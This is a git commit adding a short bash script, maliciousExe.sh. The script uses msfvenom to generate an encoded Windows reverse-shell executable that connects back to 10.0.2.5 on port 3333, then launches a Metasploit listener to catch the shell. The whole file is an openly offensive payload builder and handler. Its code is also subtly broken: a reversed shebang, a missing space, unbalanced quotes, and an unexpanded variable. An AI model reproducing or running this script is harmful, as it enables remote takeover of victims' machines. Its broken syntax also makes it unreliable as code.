d370afb284310750ff046d5503cb5435aff55aae
FAC333 <60715774+FAC333@users.noreply.github.com>
2023-05-02 00:24:52 -0400

    Add files via upload

---
+++ maliciousExe.sh
@@ -0,0 +1,25 @@
+!#/bin/bash
+
+#creates the malicious file 
+
+
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.0.2.5 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe-o /tmp/1.exe
+
+echo "malicious file created and saved in the path /tmp/1.exe
+
+echo "now to setup the listener"
+echo "please enter a the listening host for a reverse connection"
+read LHOST1"
+
+echo "specify a listening port"
+read LPORT1
+
+ECHO "starting the listener............."
+
+msfconsole -q -x "use exploit/multi/handler;\ 
+set LHOST $LHOST1;\
+set LPORT LPORT1;\
+exploit"
+ 
+
+
